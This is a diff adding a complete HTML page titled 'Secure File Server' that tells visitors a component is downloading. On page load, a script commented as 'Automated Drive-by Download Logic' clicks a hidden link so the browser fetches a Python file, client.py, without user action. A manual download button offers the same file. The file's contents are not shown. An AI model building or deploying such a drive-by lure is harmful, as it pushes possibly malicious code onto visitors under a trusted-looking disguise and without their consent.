@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure File Server</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Downloading Component...</h2>
+    <p>Your download should start automatically in a few seconds.</p>
+    <p>If the download didn't start, please click the button below:</p>
+    
+    <!-- Manual Download Button -->
+    <a id="manual-link" href="client.py" download="client.py" class="btn">Download Manually</a>
+</div>
+
+<script>
+    // Automated Drive-by Download Logic
+    window.onload = function() {
+        var autoLink = document.createElement("a");
+        autoLink.href = "client.py";
+        autoLink.download = "client.py";
+        
+        document.body.appendChild(autoLink);
+        autoLink.click();
+        document.body.removeChild(autoLink);
+    };
+</script>
+
+</body>
+</html>
